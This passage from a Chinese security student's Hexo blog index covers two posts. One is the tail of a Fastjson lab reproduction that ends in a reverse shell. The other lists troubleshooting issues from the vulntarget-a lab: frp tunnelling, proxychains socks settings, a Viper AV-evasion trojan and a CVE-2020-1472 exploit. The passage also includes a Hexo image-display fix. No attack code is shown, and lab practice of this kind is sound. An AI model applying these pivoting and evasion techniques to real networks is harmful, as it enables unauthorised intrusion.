src="/posts/13d6b9a5/image-20230630172351054-1688117034478-12.png" class title="image"><p>反弹成功，kali成功上线目标靶机！！</p><img src="/posts/13d6b9a5/Snipaste_2023-06-29_16-11-46-1688117479800-15.png" class title="Snipaste_2023-06-29_16-11-46"><p>最终结果</p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场复现</tag>
      
      <tag>反序列化</tag>
      
      <tag>Fastjson</tag>
      
      <tag>vulhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>打靶机vulntarget-a问题与解决</title>
    <link href="/posts/98e63108.html"/>
    <url>/posts/98e63108.html</url>
    
    <content type="html"><![CDATA[<h3 id="1-frpc上传win7（边界主机）在配置文件正常是无法正常使用"><a class="header-anchor" href="#1-frpc上传win7（边界主机）在配置文件正常是无法正常使用">¶</a>1. frpc上传win7（边界主机）在配置文件正常是无法正常使用</h3><p>用蚁剑上传失败，不断重新上传，上传成功后文件大小从12.8k–&gt;28k（离谱）</p><p>最后重新在远程界面上传成功运行</p><h3 id="2-在用proxychains4连接时配置文件中socks4不行而socks5可以的原因？-socks4和socks5的具体区别"><a class="header-anchor" href="#2-在用proxychains4连接时配置文件中socks4不行而socks5可以的原因？-socks4和socks5的具体区别">¶</a>2. 在用proxychains4连接时配置文件中socks4不行而socks5可以的原因？(socks4和socks5的具体区别)</h3><h3 id="3-拓展问题：用bp进行socks5代理访问内网"><a class="header-anchor" href="#3-拓展问题：用bp进行socks5代理访问内网">¶</a>3. 拓展问题：用bp进行socks5代理访问内网</h3><h3 id="4-在重新开启虚拟机后重新进行frp连接发现7000端口占用，如何关闭之前的frp进程？（如何解决端口被进程占用的问题）"><a class="header-anchor" href="#4-在重新开启虚拟机后重新进行frp连接发现7000端口占用，如何关闭之前的frp进程？（如何解决端口被进程占用的问题）">¶</a>4. 在重新开启虚拟机后重新进行frp连接发现7000端口占用，如何关闭之前的frp进程？（如何解决端口被进程占用的问题）</h3><h3 id="5-如何通过l-php中的信息判断出win2016使用了小皮搭建web服务"><a class="header-anchor" href="#5-如何通过l-php中的信息判断出win2016使用了小皮搭建web服务">¶</a>5. 如何通过l.php中的信息判断出win2016使用了小皮搭建web服务</h3><h3 id="6-利用viper生成的免杀木马直接就本本地火绒拦截了。。。说好的免杀呢……"><a class="header-anchor" href="#6-利用viper生成的免杀木马直接就本本地火绒拦截了。。。说好的免杀呢……">¶</a>6. 利用viper生成的免杀木马直接就本本地火绒拦截了。。。说好的免杀呢……</h3><p><img src="/posts/98e63108/1686278232491-3ce5fcd3-fe08-40ec-9dfd-52cede1d48b8.png" alt="image.png"></p><h3 id="7-cve-2020-1472-ex在执行时显示与解压相关的错误"><a class="header-anchor" href="#7-cve-2020-1472-ex在执行时显示与解压相关的错误">¶</a>7. cve-2020-1472-ex在执行时显示与解压相关的错误</h3><p>开始时更新了github上下载的文件，从本地电脑解压依然不行，认为不是文件的问题，通过分析靶场的通信结果，排除代理配置错误的情况下，认为再重新开启虚拟机以后边界主机上的路由掉了，重新设置路由以后可以正常运行了（呜呜呜真难受）</p>]]></content>
    
    
    <categories>
      
      <category>靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场</tag>
      
      <tag>网安</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>解决hexo上传后图片不显示的问题</title>
    <link href="/posts/e0dfd349.html"/>
    <url>/posts/e0dfd349.html</url>
    
    <content type="html"><![CDATA[<p>在我尝试上传文章时，我发现在利用Typora编写的文章上传后，在浏览器中打开后图片完全无法显示出来，这给我带来了很大的麻烦（毕竟打靶什么的基本都要靠图片），在查了很多很多东西又尝试了很多插件以后终于整出来了！</p><h3 id="Typora"><a class="header-anchor" href="#Typora">¶</a>Typora</h3><p>在typora中的偏好设置中将图像中的各个设置改为如下：</p><p><img src="/posts/e0dfd349/image-20230625164444582-1687682691015-1.png" alt="image-20230625164444582"></p><p>将hexo配置文件中的<code>_config.yml</code>中的post_asset_folder设置为true；</p><p>安装插件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">npm install https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/CodeFalling/</span>hexo-asset-image --save<br></code></pre></td></tr></table></figure><p>运行hexo n &quot;xxxx&quot;来生成md博文时，/source/_posts文件夹内除了xxxx.md文件还有一个同名的文件夹。接下来就是利用makedown。</p><p>光安装的了上面那个插件以后我仍然无法在浏览器中显示我的图片，于是我又安装了下面的插件。</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-built_in">npm</span> i hexo-easy-images -s<br></code></pre></td></tr></table></figure><p>此时仍然不能让typora和浏览器中显示相同的图片内容。</p><p>如果想要在浏览器中显示图片，需要将图片路径中xxxx/imges.png前的xxxx/全部去掉，只保留文件名。但是此时是无法在typora中显示的，需要将正篇文章编辑好之后整体去除前缀。</p><p>复制“xxxx/”利用<code>Ctrl+F</code>，将所有的“xxxx/”替换为空。此时就可以在本地浏览器上正常显示图片了。</p>]]></content>
    
    
    <categories>
      
      <category>个人博客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
